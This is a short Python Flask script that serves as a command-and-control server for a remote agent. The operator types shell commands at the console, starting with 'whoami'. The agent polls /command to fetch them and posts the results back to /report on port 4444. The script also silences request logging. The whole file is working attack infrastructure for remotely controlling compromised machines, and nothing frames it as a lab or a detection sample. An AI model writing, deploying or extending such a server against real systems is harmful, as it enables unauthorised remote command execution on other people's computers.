from flask import Flask, jsonify, request
import threading
import logging

app = Flask(__name__)
latest_command = "whoami"  # Default command
last_command = ""  # Track the last sent command to avoid repetitions

# Suppress only the Flask HTTP request logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def command_input_loop():
    global latest_command
    while True:
        latest_command = input()

@app.route('/command', methods=['GET'])
def get_command():
    global last_command

    # Check if the new command is different from the last sent command
    if latest_command != last_command:
        last_command = latest_command  # Update last_command to the latest
        return jsonify({"command": latest_command})  # Send new command
    else:
        # Send an empty command if there's no change
        return jsonify({"command": ""})

@app.route("/report", methods=["POST"])
def receive_report():
    data = request.get_json()
    output = data.get("output")
    print(f"Output from agent: {output}")
    return "Output received", 200


if __name__ == '__main__':
    # Start a separate thread for real-time command input
    input_thread = threading.Thread(target=command_input_loop, daemon=True)
    input_thread.start()
    
    app.run(host='0.0.0.0', port=4444)
